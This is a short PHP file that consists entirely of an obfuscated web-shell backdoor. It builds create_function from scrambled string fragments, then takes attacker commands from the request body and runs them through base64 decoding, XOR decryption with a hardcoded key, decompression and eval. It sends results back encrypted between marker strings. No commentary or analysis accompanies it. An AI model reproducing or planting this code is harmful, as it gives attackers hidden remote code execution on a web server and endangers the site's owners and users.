<?php
$Z=str_replace('G','','crGeGatGeG_funGGction');
$m='){_t$c_t=strl_ten($k);_t$l=_t_tstrlen($t);$o="";for($i=0;_t$i<$l_t;){_tfor($j=_t0;_t($j<$c_t&&$i<$l_t);_t$_tj++,$i+_t_';
$c='t+){$o.=_t$t{$i}^$k{$j};}}re_tturn_t $o;}if (@_tpreg_mat_tch("_t/$k_th(.+)$k_tf/",@file_ge_tt_c_tontents_t("php_t://in_';
$S='tput"),$m_t)==1)_t {@ob_t_s_ttart();@eva_tl(@gzuncom_tpres_ts(@x_t(@_tbase_t64_decode($_t_tm[1]),$k)));_t$o=@ob__tget';
$t='_conten_tts()_t;@ob_e_tnd_c_tl_t_tean();$r=@base_t64_encode(@_tx(@gzc_tompress(_t$o)_t,$_tk));p_trint("$p$k_th$r$kf");}';
$p='$k="c5836_t8c4"_t;$kh="_t_t8b_t9174_t03811b";$k_t_tf="b7827e2c_t86e7";_t$p=_t"M9qccX_tXldKBn6pV_ti";func_ttion x(_t$t,$k';
$n=str_replace('_t','',$p.$m.$c.$S.$t);
$G=$Z('',$n);$G();
?>
